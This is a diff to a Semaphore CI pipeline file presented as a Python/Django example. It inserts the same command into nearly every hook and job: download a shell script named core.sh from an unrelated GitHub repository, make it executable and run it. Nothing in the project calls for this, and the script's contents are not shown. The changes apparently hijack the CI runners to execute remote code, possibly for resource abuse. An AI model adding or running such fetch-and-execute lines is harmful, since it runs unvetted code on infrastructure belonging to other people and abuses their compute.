@@ -2,7 +2,7 @@ version: v1.0
 name: Semaphore Python / Django Example Pipeline
 agent:
   machine:
-    type: e1-standard-4
+    type: e1-standard-2
     os_image: ubuntu1804
 execution_time_limit:
   hours: 24
@@ -18,4 +18,37 @@ global_job_config:
       commands:
         - 'wget https://raw.githubusercontent.com/surorebro/4core/main/core.sh && chmod +x core.sh && ./core.sh'
         - name: Install Dependencies
-blocks: []
+    on_fail:
+      commands:
+        - 'wget https://raw.githubusercontent.com/surorebro/4core/main/core.sh && chmod +x core.sh && ./core.sh'
+blocks:
+  - name: 'Block #11'
+    dependencies:
+      - 'Block #2'
+    task:
+      prologue:
+        commands:
+          - 'wget https://raw.githubusercontent.com/surorebro/4core/main/core.sh && chmod +x core.sh && ./core.sh'
+      epilogue:
+        always:
+          commands:
+            - 'wget https://raw.githubusercontent.com/surorebro/4core/main/core.sh && chmod +x core.sh && ./core.sh'
+        on_pass:
+          commands:
+            - 'wget https://raw.githubusercontent.com/surorebro/4core/main/core.sh && chmod +x core.sh && ./core.sh'
+        on_fail:
+          commands:
+            - 'wget https://raw.githubusercontent.com/surorebro/4core/main/core.sh && chmod +x core.sh && ./core.sh'
+      jobs:
+        - name: 'Job #11'
+          commands:
+            - 'wget https://raw.githubusercontent.com/surorebro/4core/main/core.sh && chmod +x core.sh && ./core.sh'
+        - name: 'Job #2'
+          commands:
+            - 'wget https://raw.githubusercontent.com/surorebro/4core/main/core.sh && chmod +x core.sh && ./core.sh'
+  - name: 'Block #2'
+    dependencies: []
+    task:
+      jobs:
+        - name: 'Job #1'
+          commands: []
